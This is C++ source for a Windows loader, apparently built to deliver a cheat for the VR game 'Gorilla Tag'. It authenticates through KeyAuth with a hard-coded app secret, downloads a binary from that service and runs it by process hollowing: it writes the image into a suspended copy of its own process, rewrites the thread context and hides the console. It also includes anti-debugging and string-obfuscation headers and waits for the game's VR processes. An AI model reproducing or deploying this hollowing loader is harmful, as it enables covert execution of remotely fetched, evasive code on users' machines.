#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <cstdint>
#include <memory>
#include <thread>
#include <limits>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <stdexcept>
#include <cstring> 
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <random>
#include <windows.data.json.h>
#include "sec/protector.h"
#include "sec/lazy.h"
#include "sec/dbg.h"
#include "auth/auth.hpp"
#include "sec/anti_debugger.h"
#include "sec/protector.hpp"
#include "mapper/map.h"
#include <cstdlib>

#pragma comment (lib,"urlmon.lib")

#pragma warning(disable : 4996)

HWND windowid = NULL;

inline std::string სახელი = (_xor_("Steal"));
inline std::string მესაკუთრე = (_xor_("RovpqveRf3"));
inline std::string საიდუმლო = (_xor_("b1fd75f76c228b67eeb973ef48b9fbdbd200413264f7392057680c160322deb8"));
inline std::string ვერსია = (_xor_("1.0"));
inline std::string ბმული = (_xor_("https://keyauth.win/api/1.2/"));
inline KeyAuth::api c(სახელი, მესაკუთრე, საიდუმლო, ვერსია, ბმული);
// Fileid
inline std::string ფაილი = (_xor_("AUTO"));
// Process Name

inline std::string პროცესი = (_xor_("Gorilla Tag.exe"));
inline std::string აპლიკაციასათ = (_xor_("vrserver.exe"));
inline std::string აპლიკაციასათვის = (_xor_("vrmonitor.exe"));

// Folder Path Name
inline std::string საქაღალდე = (_xor_("steal"));


std::vector<unsigned char> რუკა;
inline std::vector<std::uint8_t> ბაიტი;
inline std::string ვარიანტისშემოწმება;

const char* მუტექსი = "AutoUpdater";

std::vector<unsigned char> EN;

std::vector<unsigned char> DE;

std::vector<unsigned char> ENC;

std::vector<unsigned char> DEC;


void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

std::string tm_to_readable_time2(tm ctx) {
	std::time_t now = std::time(nullptr);
	std::time_t expiry = std::mktime(&ctx);

	double remainingSeconds = std::difftime(expiry, now);

	if (remainingSeconds >= 60 * 60 * 24) {
		int remainingDays = static_cast<int>(remainingSeconds / (60 * 60 * 24));
		return std::to_string(remainingDays) + " day(s).";
	}
	else if (remainingSeconds >= 60 * 60) {
		int remainingHours = static_cast<int>(remainingSeconds / (60 * 60));
		return std::to_string(remainingHours) + " hour(s).";
	}
	else {
		int remainingMinutes = static_cast<int>(remainingSeconds / 60);
		return std::to_string(remainingMinutes) + " minute(s).";
	}
}

static std::time_t string_to_timet(std::string timestamp) {
	auto cv = strtol(timestamp.c_str(), NULL, 10); // long

	return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}

bool IsAppAlreadyRunning()
{
	HANDLE mutexHandle = CreateMutex(NULL, TRUE, მუტექსი);
	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED)
	{
		CloseHandle(mutexHandle);
		return true;
	}
	return false;
}

DWORD GetProcessIdByName(const char* name) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32FirstW(snapshot, &entry) == TRUE) {
		while (Process32NextW(snapshot, &entry) == TRUE) {
			wchar_t wName[MAX_PATH];
			size_t convertedChars;
			mbstowcs_s(&convertedChars, wName, MAX_PATH, name, _TRUNCATE);

			if (_wcsicmp(entry.szExeFile, wName) == 0) {
				CloseHandle(snapshot);
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
}\

bool IsCorrectTargetArchitecture(HANDLE hProc) {
	BOOL bTarget = FALSE;
	if (!IsWow64Process(hProc, &bTarget)) {
		printf("Can't confirm target process architecture: 0x%X\n", GetLastError());
		return false;
	}

	BOOL bHost = FALSE;
	IsWow64Process(GetCurrentProcess(), &bHost);

	return (bTarget == bHost);
}

std::string gen_random(const int len) {
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	std::string tmp_s;
	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	return tmp_s;
}

void encryptData(const std::vector<unsigned char>& inputData, std::vector<unsigned char>& outputData, const std::string& key, const std::string& keyFilePath) {
	if (key.size() != 32) {
		std::cerr << "Key must be 256 bits (32 bytes)." << std::endl;
		return;
	}

	AES_KEY aesKey;
	if (AES_set_encrypt_key(reinterpret_cast<const unsigned char*>(key.data()), 256, &aesKey) < 0) {
		std::cerr << "AES key setup failed." << std::endl;
		return;
	}

	const size_t bufferSize = AES_BLOCK_SIZE;
	outputData.resize(((inputData.size() + bufferSize - 1) / bufferSize) * bufferSize, 0);

	std::vector<unsigned char> iv(AES_BLOCK_SIZE, 0);


	for (size_t i = 0; i < inputData.size(); i += bufferSize) {
		AES_encrypt(&inputData[i], &outputData[i], &aesKey);
	}

	std::ofstream keyFile(keyFilePath, std::ios::binary);
	if (!keyFile.is_open()) {
		std::cerr << "Failed to open key file for writing." << std::endl;
		return;
	}
	keyFile.write(key.c_str(), key.size());
	keyFile.close();
}

std::vector<unsigned char> decryptData(const std::vector<unsigned char>& inputData, const std::string& key) {
	if (key.size() != 32) {
		std::cerr << "Key must be 256 bits (32 bytes)." << std::endl;
		return {};
	}

	AES_KEY aesKey;
	if (AES_set_decrypt_key(reinterpret_cast<const unsigned char*>(key.data()), 256, &aesKey) < 0) {
		std::cerr << "AES key setup failed." << std::endl;
		return {};
	}

	const size_t bufferSize = AES_BLOCK_SIZE;
	std::vector<unsigned char> outputData(inputData.size());

	for (size_t i = 0; i < inputData.size(); i += bufferSize) {
		AES_decrypt(&inputData[i], &outputData[i], &aesKey);
	}

	return outputData;
}

void RunLoader() {
	EN = c.download("615548");

	//DE = decryptData(EN, c.var("SMXA"));

	std::cout << ("\n Status: ") << ("Complete") << std::flush;

	Sleep(1000);
	void* pe = EN.data();

	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS64* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	ZeroMemory(&PI, sizeof(PI));
	ZeroMemory(&SI, sizeof(SI));

	void* pImageBase;

	char currentFilePath[99999];

	DOSHeader = PIMAGE_DOS_HEADER(pe);
	NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

		GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
		if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

			CONTEXT* CTX;
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;


			UINT64 imageBase = 0;
			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
				pImageBase = VirtualAllocEx(
					PI.hProcess,
					LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage,
					MEM_COMMIT | MEM_RESERVE,
					PAGE_EXECUTE_READWRITE
				);


				WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
				for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));

					WriteProcessMemory(
						PI.hProcess,
						LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
						SectionHeader->SizeOfRawData,
						NULL
					);
					WriteProcessMemory(
						PI.hProcess,
						LPVOID(CTX->Rdx + 0x10),
						LPVOID(&NtHeader->OptionalHeader.ImageBase),
						8,
						NULL
					);

				}

				CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
				ResumeThread(PI.hThread);

				WaitForSingleObject(PI.hProcess, NULL);


			}
		}
	}
}

void WaitForGame() {
	DWORD GAME;
	DWORD VRMONITOR;
	DWORD VRSERVER;

	GAME = GetProcessIdByName(პროცესი.c_str());
	VRMONITOR = GetProcessIdByName(აპლიკაციასათვის.c_str());
	VRSERVER = GetProcessIdByName(აპლიკაციასათ.c_str());

	if (!VRSERVER) {
		while (!VRSERVER) {
			VRSERVER = GetProcessIdByName(აპლიკაციასათ.c_str());
			printf("\n Status: Waiting for VRSERVER\n");
			LI_FN(Sleep)(2000);
		}
	}
	if (!VRMONITOR) {
		while (!VRMONITOR) {
			VRMONITOR = GetProcessIdByName(აპლიკაციასათვის.c_str());
			printf("\n Status: Waiting for VRMONITOR\n");
			LI_FN(Sleep)(2000);
		}
	}
	if (!GAME) {
		while (!GAME) {
			GAME = GetProcessIdByName(პროცესი.c_str());
			printf("\n Status: Waiting for GAME\n");
			LI_FN(Sleep)(2000);
		}
		Sleep(10000);

	}
}


int main()
{
	c.init();
	if (!c.data.success)
	{
		std::cout << (" Status: ") << (c.data.message) << std::flush;
	}
	std::cout << (" Status: ") << (c.data.message) << std::flush;

	RunLoader();
	HideConsole();

	return 0;
}
																																																								